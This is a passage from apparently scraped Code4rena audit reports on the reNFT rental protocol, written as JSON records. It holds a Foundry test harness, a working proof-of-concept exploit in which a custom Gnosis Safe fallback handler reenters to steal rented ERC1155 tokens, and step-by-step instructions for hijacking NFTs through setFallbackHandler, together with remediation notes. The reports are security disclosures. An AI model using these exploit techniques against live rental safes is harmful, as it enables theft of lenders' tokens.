_createSeaportFulfillment(\n                fulfillment,\n                Fulfillment({\n                    offerComponents: _fulfillment.offerComponents,\n                    considerationComponents: _fulfillment.considerationComponents\n                })\n            );\n        }\n\n        function withSeaportMatchOrderFulfillments(\n            Fulfillment[] memory fulfillments\n        ) internal {\n            // reset all current seaport match order fulfillments\n            resetSeaportMatchOrderFulfillments();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < fulfillments.length; i++) {\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: fulfillments[i].offerComponents,\n                        considerationComponents: fulfillments[i].considerationComponents\n                    })\n                );\n            }\n        }\n\n        function withBaseOrderFulfillmentComponents() internal {\n            // create offer fulfillments. We need to specify which offer items can be aggregated\n            // into one transaction. For example, 2 different orders where the same seller is offering\n            // the same item in each.\n            //\n            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment\n            // is created for each order.\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                // get a pointer to a new offer fulfillment array. This array will contain indexes of\n                // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments\n                    .push();\n\n                // number of offer items in the order\n                uint256 offerItemsInOrder = ordersToFulfill[i]\n                    .advancedOrder\n                    .parameters\n                    .offer\n                    .length;\n\n                // add a single fulfillment component for each offer item in the order\n                for (uint256 j = 0; j < offerItemsInOrder; j++) {\n                    offerFulfillments.push(\n                        FulfillmentComponent({orderIndex: i, itemIndex: j})\n                    );\n                }\n            }\n\n            // create consideration fulfillments. We need to specify which consideration items can be aggregated\n            // into one transaction. For example, 3 different orders where the same fungible consideration items are\n            // expected in return.\n            //\n            // get a pointer to a new offer fulfillment array. This array will contain indexes of\n            // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n            FulfillmentComponent[]\n                storage considerationFulfillments = seaportConsiderationFulfillments.push();\n\n            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because\n            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the\n            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer\n            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.\n            //\n            // put all fulfillments into one which can be an aggregated transfer\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                considerationFulfillments.push(\n                    FulfillmentComponent({orderIndex: i, itemIndex: 0})\n                );\n            }\n        }\n\n        function withLinkedPayAndPayeeOrders(\n            uint256 payOrderIndex,\n            uint256 payeeOrderIndex\n        ) internal {\n            // get the PAYEE order\n            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]\n                .advancedOrder\n                .parameters;\n\n            // For each consideration item in the PAYEE order, a fulfillment should be\n            // constructed with a corresponding item from the PAY order's offer items.\n            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {\n                // define the offer components\n                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);\n                offerComponents[0] = FulfillmentComponent({\n                    orderIndex: payOrderIndex,\n                    itemIndex: i\n                });\n\n                // define the consideration components\n                FulfillmentComponent[]\n                    memory considerationComponents = new FulfillmentComponent[](1);\n                considerationComponents[0] = FulfillmentComponent({\n                    orderIndex: payeeOrderIndex,\n                    itemIndex: i\n                });\n\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: offerComponents,\n                        considerationComponents: considerationComponents\n                    })\n                );\n            }\n        }\n\n        function resetFulfiller() internal {\n            delete fulfiller;\n        }\n\n        function resetOrdersToFulfill() internal {\n            delete ordersToFulfill;\n        }\n\n        function resetSeaportMatchOrderFulfillments() internal {\n            delete seaportMatchOrderFulfillments;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                           Fulfillment Finalization                          //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function _finalizePayOrderFulfillment(\n            bytes memory expectedError\n        )\n            private\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            // get the orders to fulfill\n            OrderToFulfill memory payOrder = ordersToFulfill[0];\n            OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n\n            // create rental orders\n            payRentalOrder = _createRentalOrder(payOrder);\n            payeeRentalOrder = _createRentalOrder(payeeOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(payRentalOrder),\n                    payOrder.payload.metadata.emittedExtraData,\n                    payRentalOrder.seaportOrderHash,\n                    payRentalOrder.items,\n                    payRentalOrder.hooks,\n                    payRentalOrder.orderType,\n                    payRentalOrder.lender,\n                    payRentalOrder.renter,\n                    payRentalOrder.rentalWallet,\n                    payRentalOrder.startTimestamp,\n                    payRentalOrder.endTimestamp\n                );\n            }\n\n            // the offerer of the PAYEE order fulfills the orders.\n            vm.prank(fulfiller.addr);\n\n            // fulfill the orders\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrderFulfillment()\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizePayOrderFulfillmentWithError(\n            bytes memory expectedError\n        )\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);\n        }\n\n        function _finalizeBaseOrderFulfillment(\n            bytes memory expectedError\n        ) private returns (RentalOrder memory rentalOrder) {\n            // get the order to fulfill\n            OrderToFulfill memory baseOrder = ordersToFulfill[0];\n\n            // create a rental order\n            rentalOrder = _createRentalOrder(baseOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrder),\n                    baseOrder.payload.metadata.emittedExtraData,\n                    rentalOrder.seaportOrderHash,\n                    rentalOrder.items,\n                    rentalOrder.hooks,\n                    rentalOrder.orderType,\n                    rentalOrder.lender,\n                    rentalOrder.renter,\n                    rentalOrder.rentalWallet,\n                    rentalOrder.startTimestamp,\n                    rentalOrder.endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAdvancedOrder(\n                baseOrder.advancedOrder,\n                new CriteriaResolver[](0),\n                conduitKey,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizeBaseOrderFulfillment()\n            internal\n            returns (RentalOrder memory rentalOrder)\n        {\n            rentalOrder = _finalizeBaseOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizeBaseOrderFulfillmentWithError(\n            bytes memory expectedError\n        ) internal returns (RentalOrder memory rentalOrder) {\n            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);\n        }\n\n        function finalizeBaseOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrders[i]),\n                    ordersToFulfill[i].payload.metadata.emittedExtraData,\n                    rentalOrders[i].seaportOrderHash,\n                    rentalOrders[i].items,\n                    rentalOrders[i].hooks,\n                    rentalOrders[i].orderType,\n                    rentalOrders[i].lender,\n                    rentalOrders[i].renter,\n                    rentalOrders[i].rentalWallet,\n                    rentalOrders[i].startTimestamp,\n                    rentalOrders[i].endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAvailableAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportOfferFulfillments,\n                seaportConsiderationFulfillments,\n                conduitKey,\n                seaportRecipient,\n                ordersToFulfill.length\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                // only expect the event if its a PAY order\n                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {\n                    vm.expectEmit({emitter: address(create)});\n                    emit Events.RentalOrderStarted(\n                        create.getRentalOrderHash(rentalOrders[i]),\n                        ordersToFulfill[i].payload.metadata.emittedExtraData,\n                        rentalOrders[i].seaportOrderHash,\n                        rentalOrders[i].items,\n                        rentalOrders[i].hooks,\n                        rentalOrders[i].orderType,\n                        rentalOrders[i].lender,\n                        rentalOrders[i].renter,\n                        rentalOrders[i].rentalWallet,\n                        rentalOrders[i].startTimestamp,\n                        rentalOrders[i].endTimestamp\n                    );\n                }\n            }\n\n            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter\n            // what the recipient address is\n            vm.prank(fulfiller.addr);\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function _deconstructOrdersToFulfill()\n            private\n            view\n            returns (AdvancedOrder[] memory advancedOrders)\n        {\n            // get the length of the orders to fulfill\n            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);\n\n            // build up the advanced orders\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                advancedOrders[i] = ordersToFulfill[i].advancedOrder;\n            }\n        }\n    }\n\n    contract SetupReNFT is OrderFulfiller {}\n\n</details>\n\n<details>\n<summary><b>Exploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        Order,\n        FulfillmentComponent,\n        Fulfillment,\n        ItemType as SeaportItemType\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\n    import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\n    import {SetupReNFT} from \"./SetupExploit.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import \"forge-std/console.sol\";\n\n\n\n    contract Exploit is SetupReNFT, Assertions, Constants {\n\n        function test_ERC1155_Exploit() public {\n\n            // Impersonate the attacker\n            vm.startPrank(attacker.addr);\n\n            // The custom fallback handler the attacker created.\n            CustomFallbackHandler customFallbackHandler = new CustomFallbackHandler(attacker.addr);\n\n            // Set the attacker's safe address on the fallback handler which the fallback handler will communicate with.\n            customFallbackHandler.setSafeAddr(address(attacker.safe));\n\n            // Set the address of the token which the attacker wants to hijack on the fallback handler.\n            customFallbackHandler.setTokenToHijackAddr(address(erc1155s[0]));\n\n            // The `setFallbackHandler` TX\n            bytes memory transaction = abi.encodeWithSelector(\n                Safe.setFallbackHandler.selector,\n                address(customFallbackHandler)\n            );\n\n            // The signature of the `setFallbackHandler` TX\n            bytes memory transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(attacker.safe),\n                transaction\n            );\n\n            // Execute the transaction on attacker's safe\n            SafeUtils.executeTransaction(\n                address(attacker.safe),\n                address(attacker.safe),\n                transaction,\n                transactionSignature\n            );\n\n\n\n            // The malicious TX which the custom fallback handler will execute when `onERC1155Received` is called.\n            bytes memory hijackTX = abi.encodeWithSignature(\n                \"safeTransferFrom(address,address,uint256,uint256,bytes)\",\n                address(attacker.safe),\n                address(attacker.addr),\n                0,\n                100,\n                \"\"\n            );\n\n\n            // Get the signature of the malicious TX.\n            transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(address(erc1155s[0])),\n                hijackTX\n            );\n\n\n            // Set the malicious TX and it's signature on the custom fallback handler contract so that it sends it\n            customFallbackHandler.setSignatureAndTransaction(transactionSignature, hijackTX);\n\n            vm.stopPrank();\n\n            /////////////////////////////////////////////\n            // Order Creation & Fulfillment simulation //\n            /////////////////////////////////////////////\n\n            // Alice creates a BASE order\n            createOrder({\n                offerer: alice,\n                orderType: OrderType.BASE,\n                erc721Offers: 0,\n                erc1155Offers: 1,\n                erc20Offers: 0,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // Finalize the order creation\n            (\n                Order memory order,\n                bytes32 orderHash,\n                OrderMetadata memory metadata\n            ) = finalizeOrder();\n            \n\n            // Create an order fulfillment\n            createOrderFulfillment({\n                _fulfiller: attacker,\n                order: order,\n                orderHash: orderHash,\n                metadata: metadata\n            });\n\n            // Finalize the base order fulfillment\n            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n            // get the rental order hash\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n\n            ////////////////////////////\n            // Token Theft Proof      //\n            ////////////////////////////\n\n            uint256 attackersBalance = erc1155s[0].balanceOf(address(attacker.addr), 0);\n            uint256 attackersSafeBalance = erc1155s[0].balanceOf(address(attacker.safe), 0);\n\n            if (attackersSafeBalance == uint256(0) && attackersBalance == uint256(100)) {\n                console.log(\"Tokens successfully hijacked from the attacker's (borrower) safe!\");\n            }\n\n            // Assert that the rental order was stored\n            assertEq(STORE.orders(rentalOrderHash), true);\n\n            // Assert that the token is in storage\n            assertEq(STORE.isRentedOut(address(attacker.safe), address(erc1155s[0]), 0), true);\n\n            // assert that the fulfiller made a payment\n            assertEq(erc20s[0].balanceOf(attacker.addr), uint256(9900));\n\n            // assert that a payment was made to the escrow contract\n            assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n\n            // assert that a payment was synced properly in the escrow contract\n            assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n\n        }\n\n    }\n\n\n    interface Safe {\n        function execTransaction(\n            address to,\n            uint256 value,\n            bytes calldata data,\n            Enum.Operation operation,\n            uint256 safeTxGas,\n            uint256 baseGas,\n            uint256 gasPrice,\n            address gasToken,\n            address payable refundReceiver,\n            bytes memory signatures\n        ) external payable returns (bool success);\n\n        function setFallbackHandler(address handler) external;\n\n        function addOwnerWithThreshold(address owner, uint256 threshold) external;\n    }\n\n\n    contract CustomFallbackHandler {\n\n        address private owner; // The address of the attacker.\n        address private safe; // The address of the attacker's safe.\n        address private tokenToHijack; // The address of the token which the attacker wants to hijack.\n        bytes maliciousSafeTransactionSignature; // Signature needed for the Safe TX.\n        bytes maliciousSafeTransaction; // The transaction sent to the attacker's safe which will hijack the token\n\n        constructor(address _owner) {\n            owner = _owner;\n        }\n\n        function onERC1155Received(\n            address,\n            address,\n            uint256,\n            uint256,\n            bytes calldata\n        ) external returns(bytes4) {\n\n            _transferHijackedTokensToOwner();\n\n            return 0xf23a6e61;\n        }\n\n        function _transferHijackedTokensToOwner() internal returns(bool) {\n\n            SafeUtils.executeTransaction(\n                address(safe),\n                address(tokenToHijack),\n                maliciousSafeTransaction,\n                maliciousSafeTransactionSignature\n            );\n\n            return true;\n\n        }\n\n        function setSafeAddr(address _safe) external onlyOwner {\n            safe = _safe;\n        }\n\n        function setTokenToHijackAddr(address _tokenAddr) external onlyOwner {\n            tokenToHijack = _tokenAddr;\n        }\n\n        function setSignatureAndTransaction(bytes memory _signature, bytes memory _transaction) external onlyOwner {\n            maliciousSafeTransactionSignature = _signature;\n            maliciousSafeTransaction = _transaction;\n        }\n\n        modifier onlyOwner {\n            require(msg.sender == owner);\n            _;\n        }\n\n    }\n\n</details>\n\n***\n\n### Impact\n\n***\n\nAn attacker can hijack any ERC1155 token he rents, and the lender won't be able to get the rental funds he should get after rental expiry.\n\n***\n\n### Remediation\n\n***\n\nThe main problem is that the token transferral occurs before the rental is registered, so the fix I propose is that the lender's ERC1155 tokens be transferred first to a trusted contract which registers the rental and then the trusted contract sends the ERC1155 tokens to the borrower's rental safe after ensuring the rental was registered. This fix would break this exploit.\n\n***\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/588#issuecomment-1917191218):**\n > > In short, the main issue is that https://github.com/code-423n4/2024-01-renft-findings/issues/593 doesn't validate the address supplied to setFallbackHandler as it should, and the main issue with this reported bug is that tokens are transferred directly to the rental safe prior to being registered.\n> \n> I think this is correct and why these issues should remain distinct.  Currently my point of view is:\n> \n> 1) fixing the guard is required\n> 2) fixing the ability to interact before the token is registered is also required\n> \n> 2 fixes, 2 issues.  Would welcome one last comment from @0xA5DF prior to calling this final\n\n**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/588#issuecomment-1917288429):**\n > Totally agree with @0xean that these are 2 distinct issues\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/588)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/14) - Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/43), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/32) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/4).\n\n***\n\n",
      "summary": "\nA Gnosis Safe Fallback Handler is a contract that handles unknown functions for a safe. This feature allows for more flexibility for the user. The bug is that when transferring ERC1155 tokens, the fallback handler is not aware of the rental, allowing an attacker to hijack the tokens by creating a custom fallback handler that instructs the safe to transfer the tokens to the attacker's address. To run a proof of concept, follow the steps outlined in the report.",
      "report_date": {},
      "contest_prize_txt": "83600",
      "contest_link": "https://code4rena.com/reports/2024-01-renft",
      "sponsor_name": "reNFT",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/588",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "317",
      "slug": "h-03-an-attacker-can-hijack-any-erc1155-token-he-rents-due-to-a-design-issue-in-renft-via-reentrancy-exploitation-code4rena-renft-renft-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "reNFT",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "reNFT",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "30522",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 15,
      "protocol_id": "1238",
      "title": "[H-02] An attacker is able to hijack any ERC721 / ERC1155 he borrows because guard is missing validation on the address supplied to function call `setFallbackHandler()`",
      "content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **Gnosis safe fallback handlers**: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says \"If I see something unknown, then I just let the fallback handler deal with it.\"\n\n    **Example**: If you want to take a uniswap flash loan using your gnosis safe, you'll have to create a fallback handler contract with the callback function `uniswapV2Call()`. When you decide to take a flash loan using your safe, you'll send a call to `swap()` in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to call `uniswapV2Call()`, but `uniswapV2Call()` isn't actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe's fallback handler and ask it to handle the `uniswapV2Call()` TX coming from uniswap.\n\n    **Setting a fallback handler**: To set a fallback handler for your safe, you'll have to call the function [`setFallbackHandler()`](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L44) which you can find it's logic in [FallbackManager.sol](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol)\n\n2.  **Gnosis safe guards**: A gnosis guard is a contract that acts as a transaction guard which allows the owner of the safe to limit the contracts and functions that may be called by the multisig owners of the safe. ReNFT has created it's own gnosis guard contract, which is [Guard.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Guard.sol).\n\n    **Example utility**: When you ask reNFT to create a rental safe for you by calling [deployRentalSafe()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L138) in [Factory.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Factory.sol), reNFT creates a rental safe for you and automatically installs it's own guard contract on it. Everytime you send a call from your gnosis safe, this call has to first pass through that guard. If you're for example, trying to move a NFT token you rented using `transferFrom()`, it'll prevent you from doing so. When it intercepts the transaction you're trying to send, it checks for a [list of function signatures](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195) that can be malicious, for example it checks if you're trying to enable/disable a module it has not authorized. It checks if you're trying to change the guard contract address itself, It also checks if you're trying to transfer or approve a rented NFT or ERC1155 token using the most common functions like `approve()`, `safeTransferFrom()`, `transferFrom()`, `setApprovalForAll()`. This guard acts as the single and most important defense line against rented ERC721/1155 token theft.\n\n***\n\n### The Vulnerability & Exploitation Steps\n\n***\n\nWhile the gnosis guard checks for a comprehensive list of potentially malicious function calls, it doesn't have any validation or checks for the `address` parameter of the function `setFallbackHandler(address handler)`, which is the function used by the rental safe owner to set a fallback handler his safe. This is super dangerous because it allows an attacker to hijack ANY ERC721 or ERC1155 token he rents by following these steps:\n\n1.  Sets the fallback handler address of the safe to be the address of the token he rented which he wants to hijack, let's say it's an ERC721 token.\n\n2.  Sends a `transferFrom(from, to, tokenId)` call to the gnosis safe contract while supplying the following parameters:\n    1.  `from` -> the address of the rental safe holding the token.\n    2.  `to` -> the address of the attacker himself.\n    3.  `tokenId` -> the ID of the token he wants to hijack.\n\n3.  The gnosis safe contract doesn't have the function `transferFrom()` implemented, so it'll [reach out and send a call to](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L78) the fallback handler address which is the address of the rented token contract and forward the calldata gnosis received from the attacker's call to the rented token contract.\n\n4.  Since it's the gnosis rental safe talking to the the rented token contract, and since the rental safe is the owner of the NFT, the ERC721 rented token contract will happily make the transfer and send the token to the attacker.\n\n5.  Token is hijacked, and the lender of the token won't be able to get it back or get the funds he's supposed to receive from the rental process.\n\n***\n\n### Proof of concept\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_ERC721_1155_Exploit -vvv`\n\n*Note: All of my 7 PoCs throughout my reports include the `SetupExploit.sol`. Please do not rely on the previous `SetupExploit.sol` file if you already had one in the tests/ folder. In some PoCs, there are slight modifications done in that file to properly set up the test infrastructure for the exploit*\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import {Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            